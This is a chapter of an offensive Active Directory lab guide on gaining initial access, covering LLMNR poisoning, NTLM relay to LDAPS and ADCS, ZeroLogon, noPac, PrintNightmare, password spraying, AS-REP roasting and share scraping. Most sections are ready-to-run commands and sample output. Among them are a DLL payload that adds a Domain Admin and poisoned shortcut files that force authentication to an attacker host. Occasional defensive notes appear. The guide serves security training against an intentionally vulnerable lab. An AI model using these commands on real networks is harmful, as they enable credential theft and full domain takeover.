# 09 — Initial Access: From Zero Credentials to First Shell

> "The hardest credential to steal is the first one. After that, everything is graph traversal."

You are on the network with **no credentials**. How do you get the first one? This chapter covers the 50 IA-* techniques in DVAD's `PLAN.md`, grouped by vector class.

The principle: **Windows networks broadcast.** Default protocols leak. Anonymous endpoints exist. Misconfigured templates accept your enrollment. Users authenticate to you when you tell them to.

---

## 9.0 (Concept) The seven onramps

```
+-------------------------------------------------+
| 1. Network response poisoning                   |   LLMNR, NBT-NS, mDNS, DHCPv6
+-------------------------------------------------+
| 2. Anonymous service surfaces                   |   LDAP null, SMB null, RPC, RID cycle
+-------------------------------------------------+
| 3. Coerced authentication + relay               |   PetitPotam, Spooler, DFS + ntlmrelayx
+-------------------------------------------------+
| 4. Pre-auth Kerberos / cert flaws               |   AS-REP roast, ESC8 unauth relay
+-------------------------------------------------+
| 5. Public credential leaks                      |   SYSVOL GPP, share-scrape config files
+-------------------------------------------------+
| 6. Weak service authentication                  |   anon MSSQL, default web app creds
+-------------------------------------------------+
| 7. Direct CVEs                                  |   ZeroLogon, PrintNightmare, noPac, smbghost
+-------------------------------------------------+
```

DVAD instantiates all seven. The strategy is **try them in parallel**, not one at a time — if Responder is listening while you also bash anonymous LDAP, you don't waste hours waiting for a single channel.

### Operating model

Each section below follows a four-step rhythm:

1. **Vector** — the protocol-level reason this attack works.
2. **Prerequisites** — what must be true before you try.
3. **Walkthrough** — step-by-step with exact commands.
4. **What you get** — output format and what to do with it.

Save every captured artifact (hash, ticket, cert, plaintext) under `~/dvad/loot/01-ia/<vector>/<timestamp>/`. Initial access is fragile; if a step succeeds at 02:34 AM and you don't write it down, you'll be guessing what credential you have at 09:00 when you start lateral movement.

---

## 9.1 LLMNR / NBT-NS / mDNS poisoning (Responder) — IA-007

### Vector

Windows DNS resolution fallback chain when a name doesn't resolve via the configured DNS server:

```
1. Local hosts file (C:\Windows\System32\drivers\etc\hosts)
2. DNS server
3. LLMNR (UDP/5355 multicast on link-local FF02::1:3 / 224.0.0.252)
4. NBT-NS broadcast (UDP/137)
5. mDNS (UDP/5353 multicast on FF02::FB / 224.0.0.251)
6. Fail
```

If steps 1–2 don't resolve (typo, dead WPAD, missing SRV), the OS multicasts/broadcasts the name. **Anyone on the segment can answer.** The asker doesn't verify identity — it trusts the first response.

Once you reply, the host connects to you. If you fake an SMB/HTTP server that requests NTLM auth, the host hands you a NetNTLMv2 challenge-response hash.

### Prerequisites

- L2 reachability to a Windows host that does name resolution (almost always).
- LLMNR / NBT-NS / mDNS enabled (default on every Windows release).
- A user, scheduled task, or service that triggers a name lookup the DNS can't satisfy. Common DVAD trigger: a scheduled task that runs `\\fileserv\share` where fileserv has no A record.

### Walkthrough

```bash
# Configure Responder once (already done on most Kali installs)
sudo sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf  # if you ALSO want to relay
sudo sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf # same reason

# Start Responder
sudo responder -I dvad-ctf -wrfv 2>&1 | tee ~/dvad/loot/01-ia/responder/$(date +%F_%H%M%S).log
```

Flags:
- `-I dvad-ctf` — interface name.
- `-w` — WPAD listener.
- `-r` — wpad anywhere.
- `-f` — fingerprint OS of responders.
- `-v` — verbose.
- `-A` — analyze mode (passive — listen without poisoning). Useful first to confirm there *is* legit name lookup traffic.

While Responder runs, monitor `/usr/share/responder/logs/Responder-Session.log` and the per-host `SMB-NTLMv2-SSP-<IP>.txt`.

### What you get

```
[SMB] NTLMv2-SSP Client   : 10.10.0.100
[SMB] NTLMv2-SSP Username : CORP\tony.stark
[SMB] NTLMv2-SSP Hash     : tony.stark::CORP:1122334455667788:1A...:0101...
```

Save the full hash line to `hash.txt`. Crack:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --status
```

Mode **5600** = NetNTLMv2. If the password is in rockyou, you get plaintext.

[Flag: IA-007 — LLMNR/NBT-NS poison]

### Variants and tuning

```bash
# Only poison specific names (whitelist)
sudo responder -I dvad-ctf -A   # passive scan first
# Note which names get queried; then:
sudo responder -I dvad-ctf -wrfv -i 10.10.0.1 -dr  # poison everything

# Force-trigger a captive auth via FileFinder / SCF file
# (drop a .url file in a writable share)
cat > @evil.url <<EOF
[InternetShortcut]
URL=file://attacker.corp.local
IconFile=\\\\attacker.corp.local\\share\\icon.ico
IconIndex=1
EOF
# When a user browses the share, Explorer auto-fetches the icon → NTLM auth to you.
```

### Real-life defensive note

DVAD leaves LLMNR/NBT-NS enabled. In a hardened environment:

- GPO: `Computer Configuration → Administrative Templates → Network → DNS Client → Turn Off Multicast Name Resolution`.
- NBT-NS: per-adapter NetBIOS over TCP/IP → Disabled.
- mDNS: harder; disable Bonjour services. Modern Windows still does mDNS for printer discovery.

---

## 9.2 mitm6 + ntlmrelayx (IPv6 DHCPv6/SLAAC) — IA-012

### Vector

Windows hosts run IPv6 enabled by default. If no DHCPv6 server exists (most v4 networks), they accept whoever answers. `mitm6` answers — sets *itself* as the host's DNS server.

Now any DNS lookup goes to you. You serve back AAAA records pointing to your relay endpoint. The host auths with NTLM. You relay to LDAPS on the DC — which **does not enforce SMB signing/channel binding** for LDAPS by default in older labs.

### Prerequisites

- IPv6 enabled on victim Windows hosts (default).
- No legit DHCPv6 server on segment.
- LDAP signing not enforced on the target DC, OR you have a target that accepts NTLM (HTTP/MSSQL/etc.).
- Patience — DHCPv6 renewals are infrequent (default ~1h, but workstation reboots / nightly maintenance trigger them).

### Walkthrough

```bash
# Terminal 1 — mitm6 takes over IPv6 DNS
sudo mitm6 -d corp.local -i dvad-ctf --ignore-nofqdn -v 2>&1 | tee ~/dvad/loot/01-ia/mitm6.log

# Terminal 2 — relay listener
sudo ntlmrelayx.py \
    -wh attacker.corp.local \
    -t ldaps://dc01.corp.local \
    --delegate-access \
    --no-da \
    -smb2support \
    2>&1 | tee ~/dvad/loot/01-ia/ntlmrelayx.log
```

Flags:
- `-wh attacker.corp.local` — WPAD hostname. The HTTP server returns a `wpad.dat` for any client that asks.
- `--delegate-access` — when relaying to LDAPS, create a fresh machine account and configure RBCD on the victim with the new machine account as the controller.
- `--no-da` — opt out of Domain-Admin-only operations (so you don't crash trying to dump NTDS via DRSR).
- `-smb2support` — answer SMB2 inbound (for clients that connect SMB→ntlmrelayx).

Wait. Eventually a Windows host renews DHCPv6 (often on boot or every ~30–60 min on AD-joined hosts). It accepts your DHCPv6 reply, sets you as DNS. It then queries you for, say, `dc01.corp.local`. You hand back an AAAA pointing at you for the WPAD URL. Auth fires. Relay lands.

Sample ntlmrelayx success:

```
[*] Authenticating against ldaps://dc01.corp.local as CORP\WS01$ SUCCEED
[*] SMBD-Thread-1: Connection from CORP/WS01$@10.10.0.100 controlled, attacking target ldaps://dc01.corp.local
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Adding new computer with username: EVIL3$ and password: ... result: OK
[*] Delegation rights modified successfully!
[*] EVIL3$ can now impersonate users on WS01$ via S4U2Proxy
```

### What you get

A machine account `EVIL3$` you control + RBCD configured on ws01. Now S4U2Self/S4U2Proxy from `EVIL3$` to any user → ticket for that user on ws01 → shell as that user on ws01.

```bash
impacket-getST -spn cifs/ws01.corp.local -impersonate Administrator \
               -dc-ip 10.10.0.10 \
               'corp.local/EVIL3$:<random_pw>'

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass ws01.corp.local
```

[Flag: IA-012 — mitm6 + ldaps relay → RBCD]

### Why this works specifically

Windows prefers IPv6 DNS over IPv4 (RFC 6724 source-address selection). The host doesn't ignore IPv4; you just inject yourself between v4-DNS and the application via v6.

### Defense

- Disable IPv6 on hosts that don't need it (GPO).
- Or: configure DHCPv6 guard on switches (Cisco RA Guard, similar).
- Enforce LDAP signing + channel binding on DCs.

---

## 9.3 Anonymous LDAP bind — IA-001

### Vector

Microsoft AD supports an "anonymous" LDAP bind for the root DSE and (historically) for parts of the directory. The root DSE is *always* readable; the rest depends on `dsHeuristics` and Forest functional level.

### Prerequisites

- Network reach to TCP/389.

### Walkthrough

```bash
# Root DSE (always allowed)
ldapsearch -x -H ldap://10.10.0.10 -s base -b "" \
           namingContexts defaultNamingContext rootDomainNamingContext \
           supportedLDAPVersion supportedSASLMechanisms

# Try deeper bind (DVAD usually allows several reads)
ldapsearch -x -H ldap://10.10.0.10 \
           -b 'DC=corp,DC=local' \
           -s sub '(objectClass=user)' samAccountName description \
           -LLL > anon-users.ldif

# Configuration NC (often leaks site/service info)
ldapsearch -x -H ldap://10.10.0.10 \
           -b 'CN=Configuration,DC=corp,DC=local' \
           -s sub '(objectClass=*)' cn \
           -LLL > anon-config.ldif
```

If you get a sub-tree, you have a usable **anonymous user enumeration**. Combine with kerbrute / spraying.

### What you get

User list (`samAccountName`), descriptions (sometimes contain passwords — yes, really, "Initial password: Welcome2024!"), domain SID.

[Flag: IA-001 — anonymous LDAP bind / user enum]

---

## 9.4 Anonymous SMB null sessions and share enum — IA-021

### Vector

`smbd` accepts a "null session" — auth as user `""` password `""`. Historically allowed access to IPC$ and named pipes (LSARPC, SAMR). Modern Windows restricts this with `RestrictAnonymous` (registry HKLM\System\CurrentControlSet\Control\LSA), but DVAD lowers it.

### Prerequisites

- Network reach to TCP/445.
- Target has not raised `RestrictAnonymous=2`.

### Walkthrough

```bash
# Share listing
smbclient -L //10.10.0.13 -N
smbclient -N //10.10.0.13/Public

# Pull every file
smbclient -N //10.10.0.13/Public -c 'prompt OFF; recurse ON; mget *'

# Null-session enum via samrdump
impacket-samrdump '@10.10.0.13' -no-pass

# Null SID lookup
impacket-lookupsid '@10.10.0.10' -no-pass 20000

# Best-of: enum4linux-ng
enum4linux-ng -A 10.10.0.10 -oJ ~/dvad/loot/01-ia/null-enum-dc01.json
```

### What you get

User list + group list + password policy + share list → enough to spray.

[Flag: IA-021 — null-session share enum]

---

## 9.5 SYSVOL GPP cpassword — IA-018

### Vector

Group Policy Preferences (introduced Server 2008, deprecated 2014) stored credentials in SYSVOL XML files. The encryption uses AES-256 with a key Microsoft **published** in MSDN:

```
4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
```

Any authenticated user can read SYSVOL → decrypt → plaintext.

### Prerequisites

- Any domain user credential (we got one from IA-001 + spray, IA-007 crack, IA-024 cert, etc.).
- A SYSVOL containing legacy GPP files. Microsoft patched MS14-025 to stop *new* writes, but existing files weren't touched.

### Walkthrough

```bash
impacket-Get-GPPPassword 'corp.local/peter.parker:DVADlab2024!@10.10.0.10'

# Equivalent manual approach
smbclient -U peter.parker%'DVADlab2024!' //dc01.corp.local/SYSVOL \
    -c 'prompt OFF; recurse ON; mget *'

cd corp.local
find . -name 'Groups.xml' -o -name 'Services.xml' \
       -o -name 'ScheduledTasks.xml' -o -name 'Drives.xml' \
       -o -name 'DataSources.xml' -o -name 'Printers.xml' \
    -exec grep -lH 'cpassword' {} \;

# Decode each cpassword
echo 'AES-encoded-base64-blob' | gpp-decrypt
```

### What you get

Plaintext service-account password. Often a local-admin or a domain account with privileged-group membership.

[Flag: IA-018 — SYSVOL GPP cpassword recovery]

---

## 9.6 Coerce + Relay to ADCS HTTP (ESC8) — IA-024

The classical **"zero credentials → DC compromise in 10 minutes"** path. PetitPotam can be triggered **unauthenticated** against unpatched DCs (CVE-2021-36942 + LSARPC over `\PIPE\efsrpc`). The auth gets relayed to ADCS web enrollment, which by default trusts NTLM and issues a cert for the calling DC account → PKINIT → DCSync.

### Vector

```
Attacker --PetitPotam (anonymous EFSRPC)--> DC ↘
                                              NTLM auth (DC's machine account)
ADCS HTTP <--ntlmrelayx-- Attacker          ↙
ntlmrelayx --certreq with template=DomainController--> ADCS HTTP
ADCS HTTP --issued cert for DC01$--> ntlmrelayx
Attacker  --PKINIT with DC01$ cert--> DC TGT
Attacker  --DCSync krbtgt--> game over
```

### Prerequisites

- ADCS with HTTP web enrollment enabled (`http://ca01/certsrv/`).
- A template that allows DCs to enroll for client authentication (default: `DomainController`, `KerberosAuthentication`).
- `EPA` (Extended Protection for Authentication) NOT enforced on the CA web endpoint.
- `EnforceChannelBinding` NOT set on the CA.
- Unauthenticated PetitPotam reachable (CVE-2021-36942 unpatched OR `\PIPE\efsrpc` accessible to `Authenticated Users`).

DVAD ships ESC8-vulnerable for instructional purposes.

### Walkthrough

```bash
# Terminal 1 — relay to CA HTTP, request DomainController template
sudo ntlmrelayx.py \
    -t http://ca01.corp.local/certsrv/certfnsh.asp \
    --adcs --template DomainController \
    -smb2support \
    2>&1 | tee ~/dvad/loot/01-ia/esc8-relay.log

# Terminal 2 — anonymous coercion attempt
python3 PetitPotam.py -d '' -u '' -p '' attacker.corp.local 10.10.0.10

# If anonymous coercion blocked (CVE-2021-36942 patched), fall back to authenticated:
python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' attacker.corp.local 10.10.0.10

# Or DFSCoerce / SpoolSample / ShadowCoerce
python3 dfscoerce.py -u peter.parker -p 'DVADlab2024!' -d corp.local attacker.corp.local 10.10.0.10
```

ntlmrelayx writes the issued cert as base64 to its log:

```
[*] Base64 certificate of user DC01$:
MIIRWQIBAzCCETMGCSqGSIb3DQEHAaCCESQEghEgMIIRHDCCBxIGCSqGSIb3DQEHBqCCBwMwggb/
...
```

Save to `dc01.pfx`:

```bash
# Decode the base64 blob into PFX
base64 -d > dc01.pfx <<< "MIIRWQIBAzCCETMGCSqGSIb3DQEHAa..."
```

Then PKINIT:

```bash
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.10
# Outputs the NT hash for DC01$
```

DCSync:

```bash
impacket-secretsdump -hashes :<dc01$_nthash> 'corp.local/DC01$@10.10.0.10' -just-dc \
                     -outputfile ~/dvad/loot/01-ia/ntds
```

You now have krbtgt + every user hash in the domain. Forest pwned from anonymous start.

[Flag: IA-024 — ESC8 zero-cred path]

### Why this is "the" path

Every step is unprivileged from the attacker's view:

- Coercion: anonymous (or low-priv) RPC call.
- Relay: HTTP is unsigned.
- Cert issuance: SAN matches caller, request accepted.
- PKINIT: cert is in NTAuth.
- DCSync: DC's machine account has DS-Replication-Get-Changes-All.

The patch (May 2022, KB5014754) introduced StrongCertificateBindingEnforcement and the `szOID_NTDS_CA_SECURITY_EXT` extension binding cert to user SID. ESC8 still works on **unpatched** ADCS endpoints — DVAD leaves the patch off.

---

## 9.7 Anonymous MSSQL — IA-035

### Vector

Some MSSQL servers expose default `sa` with weak password, or accept `xp_dirtree` from `public` role triggering coerced SMB auth.

### Prerequisites

- MSSQL reachable (default TCP/1433).
- Default credentials OR a `public`-callable proc that coerces auth.

### Walkthrough

```bash
# Try common defaults
for pw in '' sa 'Password1' 'SqlServer2025!' 'P@ssw0rd' 'admin'; do
  impacket-mssqlclient -windows-auth -port 1433 "sa:${pw}@10.10.0.14" \
      -no-pass <<< 'SELECT @@version' 2>/dev/null && echo "WORKS: $pw"
done

# When in:
impacket-mssqlclient sa:'SqlServer2025!'@10.10.0.14
SQL> EXEC xp_cmdshell 'whoami /all'
SQL> EXEC xp_dirtree '\\10.10.0.1\share'   # coerces NTLM from SQL service account
```

`xp_cmdshell` runs as the MSSQL service account, often `NT SERVICE\MSSQLSERVER` or a domain `svc_jarvis`. `xp_dirtree` triggers the SQL service to auth to the attacker's SMB → Responder capture → crack.

### What you get

Either local shell (xp_cmdshell) or a NetNTLMv2 hash of the service account (xp_dirtree → Responder).

[Flag: IA-035 — MSSQL anon / default-cred]

---

## 9.8 ADCS Web Enrollment without auth — IA-042

### Vector

If the CA's IIS configuration has a virtual directory with anonymous access enabled (rare in production, sometimes in lab/dev), you can enroll without authenticating.

### Prerequisites

- HTTP/HTTPS reachable to CA.
- Anonymous IIS auth on `/certsrv/` (usually disabled).

### Walkthrough

```bash
curl -v http://ca01.corp.local/certsrv/
# If 200 OK without auth → vulnerable
# If 401 Negotiate/NTLM → need creds, drop to IA-024 / IA-007 first

# If anonymous, enroll a User template manually:
curl -s 'http://ca01.corp.local/certsrv/certfnsh.asp' \
     -d 'CertRequest=-----BEGIN%20NEW...&CertAttrib=CertificateTemplate%3aUser' \
     -d 'TargetStoreFlags=0' -d 'SaveCert=yes'
```

In reality, anonymous web enrollment is a misconfiguration, not a default. Most labs need IA-024 (relay) instead.

[Flag: IA-042 — anonymous web enrollment]

---

## 9.9 ZeroLogon — direct DC takeover [CVE-2020-1472]

### Vector

Netlogon's MS-NRPC AES-CFB8 mode degenerates when the IV is all-zero AND the plaintext is all-zero AND the session-key first byte is zero. Probability per attempt ≈ 1/256. Mount 2,000 attempts → ~99% chance of one succeeding.

When you succeed, you can use `NetrServerPasswordSet2` to **set the DC's machine account password to empty**.

### Prerequisites

- Network reach to TCP/445 (Netlogon over SMB) or TCP/135 (DCERPC).
- DC unpatched OR `FullSecureChannelProtection=0` in registry (DVAD ships this way).

### Walkthrough

```bash
# Scan first (does not modify)
nxc smb 10.10.0.10 -u administrator -p '' -M zerologon -o ACTION=scan

# Exploit (sets DC machine account password to empty)
nxc smb 10.10.0.10 -u administrator -p '' -M zerologon -o ACTION=exploit

# DC$ now has empty password — DCSync directly
impacket-secretsdump -no-pass 'corp.local/DC01$@10.10.0.10' -just-dc \
                     -outputfile ~/dvad/loot/01-ia/ntds-zerologon
```

### ⚠️ CRITICAL: restore the password

Without restoration, the DC cannot replicate with other DCs. AD will fall over within minutes.

```bash
# Recover the original from the local SAM (pre-attack)
# OR use the impacket reinstall script
python3 ~/tools/ZeroLogon/reinstall_original_pw.py DC01 10.10.0.10 <ORIGINAL_HASH>

# Or via nxc
nxc smb 10.10.0.10 -u administrator -p '' -M zerologon -o ACTION=restore
```

DVAD's lab script provisions a placeholder; in a real engagement, recover the hash from the DC's local registry **before** running the attack.

[Flag: ZL-001 / cross-cut with CRED-* family]

### Why DVAD leaves it open

DVAD's PLAN.md sets `FullSecureChannelProtection=0`. Microsoft enforces the patch by default since Feb 2021 (KB4565351). The lab is a museum.

### Defense

- Apply the August 2020 patch (KB4565351).
- Verify `FullSecureChannelProtection=1` (HKLM\System\CurrentControlSet\Services\Netlogon\Parameters).
- Monitor Event 4742 (computer account changed) where target is a DC.

---

## 9.10 noPac — CVE-2021-42278 + CVE-2021-42287

### Vector

Combination of two bugs:

1. **CVE-2021-42278** (sAMAccountName spoofing) — a low-priv user with `MachineAccountQuota > 0` can create a computer account whose name *matches an existing DC's sAMAccountName without the `$`*.
2. **CVE-2021-42287** (KDC bamboozle) — when KDC issues a TGS, if the sAMAccountName lookup fails, it falls back searching by name *with* `$`. By renaming after AS-REQ but before TGS-REQ, the KDC issues a service ticket *as the real DC's PAC*.

Net effect: low-priv user → TGT impersonating Administrator.

### Prerequisites

- MAQ > 0 (default 10).
- DC unpatched (KB5008380, November 2021).
- Any domain user credential.

### Walkthrough

```bash
impacket-noPac corp.local/peter.parker:'DVADlab2024!' \
               -dc-ip 10.10.0.10 \
               -dc-host dc01.corp.local \
               -impersonate Administrator \
               -shell

# Or get just the ticket:
impacket-noPac corp.local/peter.parker:'DVADlab2024!' \
               -dc-ip 10.10.0.10 \
               -dc-host dc01.corp.local \
               -impersonate Administrator \
               -create-child administrator
```

### What you get

A TGT for `Administrator@corp.local`. Use it for DCSync or any admin action.

```bash
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass 'corp.local/Administrator@dc01.corp.local' -just-dc
```

[Flag: CRED-026 — noPac]

### Defense

KB5008380 + KB5020805. Monitor Event 4741 (computer account created) followed by 4742 (renamed) in short succession.

---

## 9.11 PrintNightmare — CVE-2021-34527

### Vector

`RpcAddPrinterDriverEx` accepts a UNC path to a driver DLL. Default ACL allowed low-priv users to call it. Load arbitrary DLL as SYSTEM on the print server (typically all DCs).

### Prerequisites

- Spooler service running.
- Target DC unpatched OR `RestrictDriverInstallationToAdministrators=0` registry override (DVAD ships this).

### Walkthrough

```bash
# Host evil.dll on SMB
sudo smbserver.py -smb2support share /tmp/share &
cp evil.dll /tmp/share/

# Trigger PrintNightmare
python3 CVE-2021-1675.py corp.local/peter.parker:'DVADlab2024!'@10.10.0.10 \
                         '\\10.10.0.1\share\evil.dll'

# evil.dll runs as SYSTEM on DC. You're done.
```

The DLL typically adds a user to Domain Admins:

```c
// evil.dll DllMain
system("net user evil P@ssw0rd123! /add /domain");
system("net group \"Domain Admins\" evil /add /domain");
```

[Flag: IA-026 / PE-031 — PrintNightmare]

### Defense

KB5005010 + `RestrictDriverInstallationToAdministrators=1`. Disable Spooler on DCs and non-print servers.

---

## 9.12 Password spraying — IA-005

### Vector

A weak password used by many accounts is more likely than a strong password used by one. Spraying tries *one* password against *many* accounts — slow enough to avoid lockout.

### Prerequisites

- User list (from IA-001, kerbrute, OSINT).
- Knowledge of lockout policy (from null-share enum → `--pass-pol`).
- Candidate passwords (the lab's `DVADlab2024!`, or `Spring2026!`, `Welcome1!`, `<Companyname>123!`).

### Walkthrough

```bash
# Get pass policy first
nxc smb 10.10.0.10 -u '' -p '' --pass-pol
# e.g. lockout-threshold = 5, observation-window = 30min

# Spray ONE password across ALL users (stay below threshold)
nxc smb 10.10.0.10 -u users.txt -p 'DVADlab2024!' --continue-on-success

# Or with kerbrute (Kerberos preauth, no 4625 events)
kerbrute passwordspray --dc 10.10.0.10 -d corp.local users.txt 'DVADlab2024!'

# Or LDAP
nxc ldap 10.10.0.10 -u users.txt -p 'DVADlab2024!' --continue-on-success
```

The "spray 1 password / observation window" rule:

```
if lockout = 5 attempts / 30 min window:
   spray <= 4 distinct passwords per 30 min per user
```

Realistic engagements: 1 password per user, wait 60 min, repeat.

### What you get

`peter.parker:DVADlab2024!` → confirmed valid.

[Flag: IA-005 — spray to first credential]

### Variants

```bash
# Spray with username==password (often catches test accounts)
nxc smb 10.10.0.10 -u users.txt -p users.txt --no-bruteforce

# Spray season+year (top-three passwords on real engagements)
for pw in 'Summer2025!' 'Autumn2025!' 'Winter2025!' 'Spring2026!'; do
  nxc smb 10.10.0.10 -u users.txt -p "$pw" --continue-on-success
  sleep 1800  # respect lockout
done
```

---

## 9.13 Kerbrute username enum (no creds) — IA-002

### Vector

Kerberos AS-REQ returns different error codes for existent/nonexistent users:

- `KDC_ERR_C_PRINCIPAL_UNKNOWN` (6) → user does not exist.
- `KDC_ERR_PREAUTH_REQUIRED` (24) → user exists, preauth required.
- `KRB_AS_REP` → user exists, NO preauth required (AS-REP-roastable).

By sending one AS-REQ per candidate name and parsing the error, you enumerate user existence.

### Prerequisites

- Reach to TCP or UDP 88.

### Walkthrough

```bash
# Generate candidate usernames
cat > names.txt <<EOF
administrator
peter.parker
tony.stark
bruce.banner
sql
svc_jarvis
svc_backup
svc_vision
EOF

# Add jsmith-style derivations
jq -r '. | .[]' employees.json | while read n; do
  fn=$(echo $n | cut -d' ' -f1 | tr '[:upper:]' '[:lower:]')
  ln=$(echo $n | cut -d' ' -f2 | tr '[:upper:]' '[:lower:]')
  echo "$fn.$ln"
  echo "$fn$ln"
  echo "${fn:0:1}$ln"
  echo "$fn"
done >> names.txt

# Run kerbrute
kerbrute userenum --dc 10.10.0.10 -d corp.local names.txt -o existing-users.txt
```

Output:
```
2026/05/21 16:03:21 >  [+] VALID USERNAME: peter.parker@corp.local
2026/05/21 16:03:21 >  [+] VALID USERNAME: svc_jarvis@corp.local
2026/05/21 16:03:21 >  [+] VALID USERNAME: tony.stark@corp.local
```

### What you get

Confirmed user list — input to IA-005 (spray) or IA-019 (AS-REP roast).

[Flag: IA-002 — kerbrute userenum]

---

## 9.14 AS-REP roast (no creds, against DONT_REQ_PREAUTH users) — IA-019

### Vector

Users with `userAccountControl & 4194304 != 0` skip Kerberos pre-auth. The KDC will hand out an AS-REP encrypted with the user's NT hash without verifying their identity. Anyone can request it.

### Prerequisites

- Reach to TCP 88.
- A username list (from IA-002 or IA-001).
- At least one user with `DONT_REQ_PREAUTH` set.

### Walkthrough

```bash
# Discovery via LDAP if you have any cred:
nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --asreproast asrep.hash

# WITHOUT creds — request all users in a list:
impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt \
                    -format hashcat -outputfile asrep.hash \
                    -dc-ip 10.10.0.10
```

Hash format (mode 18200):
```
$krb5asrep$23$peter.parker@CORP.LOCAL:abc...:def...
```

Crack:
```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

[Flag: IA-019 — AS-REP roast w/o creds]

### Why this is allowed

Pre-auth was added in RFC 4120 (2005) as an *optional* enhancement. Some MIT-Kerberos interop scenarios still need users with no pre-auth. Setting `DONT_REQ_PREAUTH` is intentional; people forget why.

---

## 9.15 Share-scrape for plaintext creds — IA-022

### Vector

Authenticated users can read most shares. Configuration files, scripts, password databases get left lying around.

### Prerequisites

- One valid credential (from earlier IA).

### Walkthrough

```bash
# Map every share you have read/write on
nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' \
    --shares --filter-shares READ,WRITE

# Recursive pull and search
for host in file01 dc01 sql01 ws01; do
  smbmap -u peter.parker -p 'DVADlab2024!' -H $host -R --depth 4 -q 2>/dev/null \
    | grep -E '\.(config|xml|kdbx|ps1|bat|cmd|vbs|txt|ini|backup|bak)$'
done

# Grep for secrets
manspider -u peter.parker -p 'DVADlab2024!' -d corp.local 10.10.0.0/21 \
          --regex 'password|passwd|pwd|cred|secret' \
          --max-filesize 5M --depth 3
```

`manspider` (BC Security) is faster than `smbmap` for large shares.

### Common finds

- `unattend.xml` — Windows install file. Local admin password in plaintext (or base64 of `password<encoded>true`).
- `*.ps1` with hardcoded creds.
- `web.config` connection strings.
- `*.kdbx` (KeePass database).
- `id_rsa` / `id_dsa` private keys.
- `Bash_history` / `PowerShell_history`.

### What you get

Plaintext passwords, often for service accounts or backup utilities.

[Flag: IA-022 — share-scrape]

---

## 9.16 WPAD spoofing (HTTP NTLM capture) — IA-023

### Vector

Internet Explorer / Edge auto-detect proxy via WPAD (`http://wpad/wpad.dat`). If you answer that name (via Responder or mitm6), you become the proxy. Every outbound HTTP request now flows through you, and you can demand NTLM auth via 407 Proxy-Authenticate.

### Prerequisites

- LLMNR/NBT-NS unrestricted (so WPAD name resolves to you), OR mitm6 (IPv6 DNS hijack).
- Web client active on victim (any browser).

### Walkthrough

```bash
sudo responder -I dvad-ctf -wrfv -P
# -P = poison WPAD
```

When a victim browses anywhere, Responder offers `wpad.dat`:

```javascript
function FindProxyForURL(url, host) { return "PROXY 10.10.0.1:3128"; }
```

Browser proxies through you → you reply 407 Proxy-Authenticate: NTLM → browser sends NTLM challenge-response.

### What you get

NetNTLMv2 hash of the user's domain account (logged-on user, not service account). Crack with mode 5600 or relay (see chapter 10).

[Flag: IA-023 — WPAD/proxy NTLM capture]

---

## 9.17 IPv6 DHCPv6 with mitm6 → no relay (just credential capture)

### Vector

Same mitm6 setup as IA-012, but instead of relay, you serve a basic HTTP authenticator and capture the NetNTLMv2 hash.

### Walkthrough

```bash
sudo mitm6 -d corp.local -i dvad-ctf -v
sudo responder -I dvad-ctf -wrfv  # captures the auth
# Wait for renewal; hash lands in Responder logs.
```

[Flag: IA-013 — mitm6 + capture]

---

## 9.18 SCF / .url / .lnk drop in writable shares — IA-014

### Vector

Drop a Windows shortcut whose icon path is a UNC referencing your attacker box. Any user who *views* the share folder triggers Explorer to resolve the icon → NTLM auth to you.

### Prerequisites

- Write access to any share users browse.

### Walkthrough

```bash
# Mount the share
smbclient -U peter.parker%'DVADlab2024!' //file01/share$

# Put the SCF
> get @evil.scf
[Shell]
Command=2
IconFile=\\10.10.0.1\share\icon.ico
[Taskbar]
Command=ToggleDesktop
^Z

# Or .url
# [InternetShortcut]
# URL=anything
# IconFile=\\10.10.0.1\share\icon.ico
# IconIndex=1

# Or .library-ms
# <?xml version="1.0" encoding="UTF-8"?>
# <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
#  <searchConnectorDescriptionList>
#   <searchConnectorDescription>
#    <simpleLocation><url>http://10.10.0.1/wp.php</url></simpleLocation>
#   </searchConnectorDescription>
#  </searchConnectorDescriptionList>
# </libraryDescription>
```

Wait. As soon as someone opens the folder, hash → Responder.

[Flag: IA-014 — share-poison]

---

## 9.19 ShadowCoerce + DFSCoerce — alternative coercion sources

### ShadowCoerce — MS-FSRVP

```bash
python3 shadowcoerce.py -d corp.local -u peter.parker -p 'DVADlab2024!' \
    attacker.corp.local 10.10.0.10
```

Triggers `\PIPE\Fssagentrpc`. Patched (KB5015888); DVAD leaves it open.

### DFSCoerce — MS-DFSNM

```bash
python3 dfscoerce.py -u peter.parker -p 'DVADlab2024!' -d corp.local \
    attacker.corp.local 10.10.0.10
```

Calls `NetrDfsAddStdRoot` / `NetrDfsRemoveStdRoot`. Triggers SMB auth from DC. No patch as of 2026-05; mitigation is signing + filter rules.

### SpoolSample — MS-RPRN

```bash
python3 SpoolSample.py corp.local/peter.parker:'DVADlab2024!' \
    target=10.10.0.10 listener=attacker.corp.local
```

Calls `RpcRemoteFindFirstPrinterChangeNotificationEx`. Requires Spooler running on target. Patched in 2021 (KB5005033) but lab-grade DCs often still run Spooler.

[Flag: IA-025, IA-026, IA-027 — coercion via FSRVP/DFS/RPRN]

---

## 9.20 Exposed WSUS / SCCM — IA-028

### Vector

WSUS clients fetch updates from a WSUS server. If the server's update transport is HTTP (not HTTPS), an attacker on the path can inject a malicious "update" → SYSTEM on clients.

### Walkthrough (briefly)

```bash
# Discover via SOAP endpoint
curl http://wsus.corp.local:8530/ClientWebService/Client.asmx
# If accessible, deploy WSUSpect to inject

# SCCM client policy is signed; less easy. But:
# - CM site-server NAA (Network Access Account) creds are stored in WMI
# - Tools: SharpSCCM, sccmhunter
sccmhunter find -u peter.parker -p 'DVADlab2024!' -d corp.local -dc-ip 10.10.0.10
```

